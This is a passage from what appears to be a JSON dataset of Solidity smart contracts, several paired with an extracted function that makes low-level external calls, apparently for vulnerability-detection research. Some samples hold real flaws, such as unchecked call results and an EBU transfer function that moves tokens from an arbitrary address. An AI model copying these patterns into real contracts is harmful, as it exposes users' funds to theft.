Channels[_lcID].ethBalances[1] = msg.value;\n }\n if(_balances[1] != 0) {\n require(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"joinChannel: token transfer failure\");\n Channels[_lcID].erc20Balances[1] = _balances[1];\n }\n Channels[_lcID].initialDeposit[0]+=_balances[0];\n Channels[_lcID].initialDeposit[1]+=_balances[1];\n Channels[_lcID].isOpen = true;\n numChannels++;\n emit DidLCJoin(_lcID, _balances[0], _balances[1]);\n }\n function deposit(bytes32 _lcID, address recipient, uint256 _balance, bool isToken) public payable {\n require(Channels[_lcID].isOpen == true, \"Tried adding funds to a closed channel\");\n require(recipient == Channels[_lcID].partyAddresses[0] || recipient == Channels[_lcID].partyAddresses[1]);\n if (Channels[_lcID].partyAddresses[0] == recipient) {\n if(isToken) {\n require(Channels[_lcID].token.transferFrom(msg.sender, this, _balance),\"deposit: token transfer failure\");\n Channels[_lcID].erc20Balances[2] += _balance;\n } else {\n require(msg.value == _balance, \"state balance does not match sent value\");\n Channels[_lcID].ethBalances[2] += msg.value;\n }\n }\n if (Channels[_lcID].partyAddresses[1] == recipient) {\n if(isToken) {\n require(Channels[_lcID].token.transferFrom(msg.sender, this, _balance),\"deposit: token transfer failure\");\n Channels[_lcID].erc20Balances[3] += _balance;\n } else {\n require(msg.value == _balance, \"state balance does not match sent value\");\n Channels[_lcID].ethBalances[3] += msg.value;\n }\n }\n emit DidLCDeposit(_lcID, recipient, _balance, isToken);\n }\n function consensusCloseChannel(\n bytes32 _lcID,\n uint256 _sequence,\n uint256[4] _balances,\n string _sigA,\n string _sigI\n )\n public\n {\n require(Channels[_lcID].isOpen == true);\n uint256 totalEthDeposit = Channels[_lcID].initialDeposit[0] + Channels[_lcID].ethBalances[2] + Channels[_lcID].ethBalances[3];\n uint256 totalTokenDeposit = Channels[_lcID].initialDeposit[1] + Channels[_lcID].erc20Balances[2] + Channels[_lcID].erc20Balances[3];\n require(totalEthDeposit == _balances[0] + _balances[1]);\n require(totalTokenDeposit == _balances[2] + _balances[3]);\n bytes32 _state = keccak256(\n abi.encodePacked(\n _lcID,\n true,\n _sequence,\n uint256(0),\n bytes32(0x0),\n Channels[_lcID].partyAddresses[0],\n Channels[_lcID].partyAddresses[1],\n _balances[0],\n _balances[1],\n _balances[2],\n _balances[3]\n )\n );\n require(Channels[_lcID].partyAddresses[0] == ECTools.recoverSigner(_state, _sigA));\n require(Channels[_lcID].partyAddresses[1] == ECTools.recoverSigner(_state, _sigI));\n Channels[_lcID].isOpen = false;\n if(_balances[0] != 0 || _balances[1] != 0) {\n Channels[_lcID].partyAddresses[0].transfer(_balances[0]);\n Channels[_lcID].partyAddresses[1].transfer(_balances[1]);\n }\n if(_balances[2] != 0 || _balances[3] != 0) {\n require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], _balances[2]),\"happyCloseChannel: token transfer failure\");\n require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[1], _balances[3]),\"happyCloseChannel: token transfer failure\");\n }\n numChannels--;\n emit DidLCClose(_lcID, _sequence, _balances[0], _balances[1], _balances[2], _balances[3]);\n }\n function updateLCstate(\n bytes32 _lcID,\n uint256[6] updateParams,\n bytes32 _VCroot,\n string _sigA,\n string _sigI\n )\n public\n {\n Channel storage channel = Channels[_lcID];\n require(channel.isOpen);\n require(channel.sequence < updateParams[0]);\n require(channel.ethBalances[0] + channel.ethBalances[1] >= updateParams[2] + updateParams[3]);\n require(channel.erc20Balances[0] + channel.erc20Balances[1] >= updateParams[4] + updateParams[5]);\n if(channel.isUpdateLCSettling == true) {\n require(channel.updateLCtimeout > now);\n }\n bytes32 _state = keccak256(\n abi.encodePacked(\n _lcID,\n false,\n updateParams[0],\n updateParams[1],\n _VCroot,\n channel.partyAddresses[0],\n channel.partyAddresses[1],\n updateParams[2],\n updateParams[3],\n updateParams[4],\n updateParams[5]\n )\n );\n require(channel.partyAddresses[0] == ECTools.recoverSigner(_state, _sigA));\n require(channel.partyAddresses[1] == ECTools.recoverSigner(_state, _sigI));\n channel.sequence = updateParams[0];\n channel.numOpenVC = updateParams[1];\n channel.ethBalances[0] = updateParams[2];\n channel.ethBalances[1] = updateParams[3];\n channel.erc20Balances[0] = updateParams[4];\n channel.erc20Balances[1] = updateParams[5];\n channel.VCrootHash = _VCroot;\n channel.isUpdateLCSettling = true;\n channel.updateLCtimeout = now + channel.confirmTime;\n emit DidLCUpdateState (\n _lcID,\n updateParams[0],\n updateParams[1],\n updateParams[2],\n updateParams[3],\n updateParams[4],\n updateParams[5],\n _VCroot,\n channel.updateLCtimeout\n );\n }\n function initVCstate(\n bytes32 _lcID,\n bytes32 _vcID,\n bytes _proof,\n address _partyA,\n address _partyB,\n uint256[2] _bond,\n uint256[4] _balances,\n string sigA\n )\n public\n {\n require(Channels[_lcID].isOpen, \"LC is closed.\");\n require(!virtualChannels[_vcID].isClose, \"VC is closed.\");\n require(Channels[_lcID].updateLCtimeout < now, \"LC timeout not over.\");\n require(virtualChannels[_vcID].updateVCtimeout == 0);\n bytes32 _initState = keccak256(\n abi.encodePacked(_vcID, uint256(0), _partyA, _partyB, _bond[0], _bond[1], _balances[0], _balances[1], _balances[2], _balances[3])\n );\n require(_partyA == ECTools.recoverSigner(_initState, sigA));\n require(_isContained(_initState, _proof, Channels[_lcID].VCrootHash) == true);\n virtualChannels[_vcID].partyA = _partyA;\n virtualChannels[_vcID].partyB = _partyB;\n virtualChannels[_vcID].sequence = uint256(0);\n virtualChannels[_vcID].ethBalances[0] = _balances[0];\n virtualChannels[_vcID].ethBalances[1] = _balances[1];\n virtualChannels[_vcID].erc20Balances[0] = _balances[2];\n virtualChannels[_vcID].erc20Balances[1] = _balances[3];\n virtualChannels[_vcID].bond = _bond;\n virtualChannels[_vcID].updateVCtimeout = now + Channels[_lcID].confirmTime;\n virtualChannels[_vcID].isInSettlementState = true;\n emit DidVCInit(_lcID, _vcID, _proof, uint256(0), _partyA, _partyB, _balances[0], _balances[1]);\n }\n function settleVC(\n bytes32 _lcID,\n bytes32 _vcID,\n uint256 updateSeq,\n address _partyA,\n address _partyB,\n uint256[4] updateBal,\n string sigA\n )\n public\n {\n require(Channels[_lcID].isOpen, \"LC is closed.\");\n require(!virtualChannels[_vcID].isClose, \"VC is closed.\");\n require(virtualChannels[_vcID].sequence < updateSeq, \"VC sequence is higher than update sequence.\");\n require(\n virtualChannels[_vcID].ethBalances[1] < updateBal[1] && virtualChannels[_vcID].erc20Balances[1] < updateBal[3],\n \"State updates may only increase recipient balance.\"\n );\n require(\n virtualChannels[_vcID].bond[0] == updateBal[0] + updateBal[1] &&\n virtualChannels[_vcID].bond[1] == updateBal[2] + updateBal[3],\n \"Incorrect balances for bonded amount\");\n require(Channels[_lcID].updateLCtimeout < now);\n bytes32 _updateState = keccak256(\n abi.encodePacked(\n _vcID,\n updateSeq,\n _partyA,\n _partyB,\n virtualChannels[_vcID].bond[0],\n virtualChannels[_vcID].bond[1],\n updateBal[0],\n updateBal[1],\n updateBal[2],\n updateBal[3]\n )\n );\n require(virtualChannels[_vcID].partyA == ECTools.recoverSigner(_updateState, sigA));\n virtualChannels[_vcID].challenger = msg.sender;\n virtualChannels[_vcID].sequence = updateSeq;\n virtualChannels[_vcID].ethBalances[0] = updateBal[0];\n virtualChannels[_vcID].ethBalances[1] = updateBal[1];\n virtualChannels[_vcID].erc20Balances[0] = updateBal[2];\n virtualChannels[_vcID].erc20Balances[1] = updateBal[3];\n virtualChannels[_vcID].updateVCtimeout = now + Channels[_lcID].confirmTime;\n emit DidVCSettle(_lcID, _vcID, updateSeq, updateBal[0], updateBal[1], msg.sender, virtualChannels[_vcID].updateVCtimeout);\n }\n function closeVirtualChannel(bytes32 _lcID, bytes32 _vcID) public {\n require(Channels[_lcID].isOpen, \"LC is closed.\");\n require(virtualChannels[_vcID].isInSettlementState, \"VC is not in settlement state.\");\n require(virtualChannels[_vcID].updateVCtimeout < now, \"Update vc timeout has not elapsed.\");\n require(!virtualChannels[_vcID].isClose, \"VC is already closed\");\n Channels[_lcID].numOpenVC--;\n virtualChannels[_vcID].isClose = true;\n if(virtualChannels[_vcID].partyA == Channels[_lcID].partyAddresses[0]) {\n Channels[_lcID].ethBalances[0] += virtualChannels[_vcID].ethBalances[0];\n Channels[_lcID].ethBalances[1] += virtualChannels[_vcID].ethBalances[1];\n Channels[_lcID].erc20Balances[0] += virtualChannels[_vcID].erc20Balances[0];\n Channels[_lcID].erc20Balances[1] += virtualChannels[_vcID].erc20Balances[1];\n } else if (virtualChannels[_vcID].partyB == Channels[_lcID].partyAddresses[0]) {\n Channels[_lcID].ethBalances[0] += virtualChannels[_vcID].ethBalances[1];\n Channels[_lcID].ethBalances[1] += virtualChannels[_vcID].ethBalances[0];\n Channels[_lcID].erc20Balances[0] += virtualChannels[_vcID].erc20Balances[1];\n Channels[_lcID].erc20Balances[1] += virtualChannels[_vcID].erc20Balances[0];\n }\n emit DidVCClose(_lcID, _vcID, virtualChannels[_vcID].erc20Balances[0], virtualChannels[_vcID].erc20Balances[1]);\n }\n function byzantineCloseChannel(bytes32 _lcID) public {\n Channel storage channel = Channels[_lcID];\n require(channel.isOpen, \"Channel is not open\");\n require(channel.isUpdateLCSettling == true);\n require(channel.numOpenVC == 0);\n require(channel.updateLCtimeout < now, \"LC timeout over.\");\n uint256 totalEthDeposit = channel.initialDeposit[0] + channel.ethBalances[2] + channel.ethBalances[3];\n uint256 totalTokenDeposit = channel.initialDeposit[1] + channel.erc20Balances[2] + channel.erc20Balances[3];\n uint256 possibleTotalEthBeforeDeposit = channel.ethBalances[0] + channel.ethBalances[1];\n uint256 possibleTotalTokenBeforeDeposit = channel.erc20Balances[0] + channel.erc20Balances[1];\n if(possibleTotalEthBeforeDeposit < totalEthDeposit) {\n channel.ethBalances[0]+=channel.ethBalances[2];\n channel.ethBalances[1]+=channel.ethBalances[3];\n } else {\n require(possibleTotalEthBeforeDeposit == totalEthDeposit);\n }\n if(possibleTotalTokenBeforeDeposit < totalTokenDeposit) {\n channel.erc20Balances[0]+=channel.erc20Balances[2];\n channel.erc20Balances[1]+=channel.erc20Balances[3];\n } else {\n require(possibleTotalTokenBeforeDeposit == totalTokenDeposit);\n }\n uint256 ethbalanceA = channel.ethBalances[0];\n uint256 ethbalanceI = channel.ethBalances[1];\n uint256 tokenbalanceA = channel.erc20Balances[0];\n uint256 tokenbalanceI = channel.erc20Balances[1];\n channel.ethBalances[0] = 0;\n channel.ethBalances[1] = 0;\n channel.erc20Balances[0] = 0;\n channel.erc20Balances[1] = 0;\n if(ethbalanceA != 0 || ethbalanceI != 0) {\n channel.partyAddresses[0].transfer(ethbalanceA);\n channel.partyAddresses[1].transfer(ethbalanceI);\n }\n if(tokenbalanceA != 0 || tokenbalanceI != 0) {\n require(\n channel.token.transfer(channel.partyAddresses[0], tokenbalanceA),\n \"byzantineCloseChannel: token transfer failure\"\n );\n require(\n channel.token.transfer(channel.partyAddresses[1], tokenbalanceI),\n \"byzantineCloseChannel: token transfer failure\"\n );\n }\n channel.isOpen = false;\n numChannels--;\n emit DidLCClose(_lcID, channel.sequence, ethbalanceA, ethbalanceI, tokenbalanceA, tokenbalanceI);\n }\n function _isContained(bytes32 _hash, bytes _proof, bytes32 _root) internal pure returns (bool) {\n bytes32 cursor = _hash;\n bytes32 proofElem;\n for (uint256 i = 64; i <= _proof.length; i += 32) {\n assembly { proofElem := mload(add(_proof, i)) }\n if (cursor < proofElem) {\n cursor = keccak256(abi.encodePacked(cursor, proofElem));\n } else {\n cursor = keccak256(abi.encodePacked(proofElem, cursor));\n }\n }\n return cursor == _root;\n }\n function getChannel(bytes32 id) public view returns (\n address[2],\n uint256[4],\n uint256[4],\n uint256[2],\n uint256,\n uint256,\n bytes32,\n uint256,\n uint256,\n bool,\n bool,\n uint256\n ) {\n Channel memory channel = Channels[id];\n return (\n channel.partyAddresses,\n channel.ethBalances,\n channel.erc20Balances,\n channel.initialDeposit,\n channel.sequence,\n channel.confirmTime,\n channel.VCrootHash,\n channel.LCopenTimeout,\n channel.updateLCtimeout,\n channel.isOpen,\n channel.isUpdateLCSettling,\n channel.numOpenVC\n );\n }\n function getVirtualChannel(bytes32 id) public view returns(\n bool,\n bool,\n uint256,\n address,\n uint256,\n address,\n address,\n address,\n uint256[2],\n uint256[2],\n uint256[2]\n ) {\n VirtualChannel memory virtualChannel = virtualChannels[id];\n return(\n virtualChannel.isClose,\n virtualChannel.isInSettlementState,\n virtualChannel.sequence,\n virtualChannel.challenger,\n virtualChannel.updateVCtimeout,\n virtualChannel.partyA,\n virtualChannel.partyB,\n virtualChannel.partyI,\n virtualChannel.ethBalances,\n virtualChannel.erc20Balances,\n virtualChannel.bond\n );\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nemit Approval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1665"
  },
  "filename": "44992.sol",
  "content": "pragma solidity ^0.5.4;\nimport \"./SafeMath.sol\";\nimport \"./BaseWallet.sol\";\nimport \"./ModuleRegistry.sol\";\nimport \"./GuardianStorage.sol\";\nimport \"./Module.sol\";\ncontract BaseModule is Module {\n bytes constant internal EMPTY_BYTES = \"\";\n ModuleRegistry internal registry;\n GuardianStorage internal guardianStorage;\n modifier onlyWhenUnlocked(BaseWallet _wallet) {\n verifyUnlocked(_wallet);\n _;\n }\n event ModuleCreated(bytes32 name);\n event ModuleInitialised(address wallet);\n constructor(ModuleRegistry _registry, GuardianStorage _guardianStorage, bytes32 _name) public {\n registry = _registry;\n guardianStorage = _guardianStorage;\n emit ModuleCreated(_name);\n }\n modifier onlyWallet(BaseWallet _wallet) {\n require(msg.sender == address(_wallet), \"BM: caller must be wallet\");\n _;\n }\n modifier onlyWalletOwner(BaseWallet _wallet) {\n verifyWalletOwner(_wallet);\n _;\n }\n modifier strictOnlyWalletOwner(BaseWallet _wallet) {\n require(isOwner(_wallet, msg.sender), \"BM: msg.sender must be an owner for the wallet\");\n _;\n }\n function init(BaseWallet _wallet) public onlyWallet(_wallet) {\n emit ModuleInitialised(address(_wallet));\n }\n function addModule(BaseWallet _wallet, Module _module) external strictOnlyWalletOwner(_wallet) {\n require(registry.isRegisteredModule(address(_module)), \"BM: module is not registered\");\n _wallet.authoriseModule(address(_module), true);\n }\n function recoverToken(address _token) external {\n uint total = ERC20(_token).balanceOf(address(this));\n bool success = ERC20(_token).transfer(address(registry), total);\n require(success, \"BM: recover token transfer failed\");\n }\n function verifyUnlocked(BaseWallet _wallet) internal view {\n require(!guardianStorage.isLocked(_wallet), \"BM: wallet locked\");\n }\n function verifyWalletOwner(BaseWallet _wallet) internal view {\n require(msg.sender == address(this) || isOwner(_wallet, msg.sender), \"BM: must be wallet owner\");\n }\n function isOwner(BaseWallet _wallet, address _addr) internal view returns (bool) {\n return _wallet.owner() == _addr;\n }\n function invokeWallet(address _wallet, address _to, uint256 _value, bytes memory _data) internal returns (bytes memory _res) {\n bool success;\n (success, _res) = _wallet.call(abi.encodeWithSignature(\"invoke(address,uint256,bytes)\", _to, _value, _data));\n if (success && _res.length > 0) {\n (_res) = abi.decode(_res, (bytes));\n } else if (_res.length > 0) {\n assembly {\n returndatacopy(0, 0, returndatasize)\n revert(0, returndatasize)\n }\n } else if (!success) {\n revert(\"BM: wallet invoke reverted\");\n }\n }\n}",
  "extract_feature": [
    "function invokeWallet(address _wallet, address _to, uint256 _value, bytes memory _data) internal returns (bytes memory _res) {\nbool success;\n(success, _res) = _wallet.call(abi.encodeWithSignature(\"invoke(address,uint256,bytes)\", _to, _value, _data));\nif (success && _res.length > 0) {\n(_res) = abi.decode(_res, (bytes));\n} else if (_res.length > 0) {\nassembly {\nreturndatacopy(0, 0, returndatasize)\nrevert(0, returndatasize)\n}\n} else if (!success) {\nrevert(\"BM: wallet invoke reverted\");\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1666"
  },
  "filename": "450.sol",
  "content": "pragma solidity ^0.4.18;\ncontract EBU{\n function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){\n require(_tos.length > 0);\n bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n for(uint i=0;i<_tos.length;i++){\n caddress.call(id,from,_tos[i],v[i]);\n }\n return true;\n }\n}",
  "extract_feature": [
    "function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){\nrequire(_tos.length > 0);\nbytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\nfor(uint i=0;i<_tos.length;i++){\ncaddress.call(id,from,_tos[i],v[i]);\n}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1667"
  },
  "filename": "45074.sol",
  "content": "pragma solidity ^0.5.4;\nimport \"./common/BaseModule.sol\";\nimport \"./common/RelayerModule.sol\";\nimport \"./common/OnlyOwnerModule.sol\";\ncontract NftTransfer is BaseModule, RelayerModule, OnlyOwnerModule {\n bytes32 constant NAME = \"NftTransfer\";\n bytes4 private constant ERC721_RECEIVED = 0x150b7a02;\n address public ckAddress;\n event NonFungibleTransfer(address indexed wallet, address indexed nftContract, uint256 indexed tokenId, address to, bytes data);\n constructor(\n ModuleRegistry _registry,\n GuardianStorage _guardianStorage,\n address _ckAddress\n )\n BaseModule(_registry, _guardianStorage, NAME)\n public\n {\n ckAddress = _ckAddress;\n }\n function init(BaseWallet _wallet) public onlyWallet(_wallet) {\n _wallet.enableStaticCall(address(this), ERC721_RECEIVED);\n }\n function onERC721Received(\n address ,\n address ,\n uint256 ,\n bytes calldata\n )\n external\n returns (bytes4)\n {\n return ERC721_RECEIVED;\n }\n function transferNFT(\n BaseWallet _wallet,\n address _nftContract,\n address _to,\n uint256 _tokenId,\n bool _safe,\n bytes calldata _data\n )\n external\n onlyWalletOwner(_wallet)\n onlyWhenUnlocked(_wallet)\n {\n bytes memory methodData;\n if (_nftContract == ckAddress) {\n methodData = abi.encodeWithSignature(\"transfer(address,uint256)\", _to, _tokenId);\n } else {\n if (_safe) {\n methodData = abi.encodeWithSignature(\n \"safeTransferFrom(address,address,uint256,bytes)\", address(_wallet), _to, _tokenId, _data);\n } else {\n require(isERC721(_nftContract, _tokenId), \"NT: Non-compliant NFT contract\");\n methodData = abi.encodeWithSignature(\n \"transferFrom(address,address,uint256)\", address(_wallet), _to, _tokenId);\n }\n }\n invokeWallet(address(_wallet), _nftContract, 0, methodData);\n emit NonFungibleTransfer(address(_wallet), _nftContract, _tokenId, _to, _data);\n }\n function isERC721(address _nftContract, uint256 _tokenId) internal returns (bool) {\n (bool success, bytes memory result) = _nftContract.call(abi.encodeWithSignature(\"supportsInterface(bytes4)\", 0x80ac58cd));\n if (success && result[0] != 0x0)\n return true;\n (success, result) = _nftContract.call(abi.encodeWithSignature(\"supportsInterface(bytes4)\", 0x6466353c));\n if (success && result[0] != 0x0)\n return true;\n (success,) = _nftContract.call(abi.encodeWithSignature(\"ownerOf(uint256)\", _tokenId));\n return success;\n }\n}",
  "extract_feature": [
    "function isERC721(address _nftContract, uint256 _tokenId) internal returns (bool) {\n(bool success, bytes memory result) = _nftContract.call(abi.encodeWithSignature(\"supportsInterface(bytes4)\", 0x80ac58cd));\nif (success && result[0] != 0x0)\nreturn true;\n(success, result) = _nftContract.call(abi.encodeWithSignature(\"supportsInterface(bytes4)\", 0x6466353c));\nif (success && result[0] != 0x0)\nreturn true;\n(success,) = _nftContract.call(abi.encodeWithSignature(\"ownerOf(uint256)\", _tokenId));\nreturn success;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1668"
  },
  "filename": "46.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token{\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns\n (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns\n (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256\n _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns\n (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success)\n {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract Token99chain is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function Token99chain(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1669"
  },
  "filename": "464.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token{\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns\n (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns\n (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256\n _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns\n (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success)\n {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract NineStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '0.1';\n function NineStandardToken(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb166a"
  },
  "filename": "516.sol",
  "content": "pragma solidity ^0.4.16;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PJR is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function PJR(\n ) {\n balances[msg.sender] = 120000000000000000000000000;\n totalSupply = 120000000000000000000000000;\n name = \"PJR\";\n decimals = 18;\n symbol = \"PJR\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb166b"
  },
  "filename": "53.sol",
  "content": "pragma solidity ^0.4.23;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PundiXCash is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function PundiXCash() {\n balances[msg.sender] = 11000000000000000000000000000;\n totalSupply = 11000000000000000000000000000;\n name = \"PundiXCash\";\n decimals = 18;\n symbol = \"NPXC\";\n unitsOneEthCanBuy = 10000000;\n fundsWallet = msg.sender;\n }\n function() public payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n 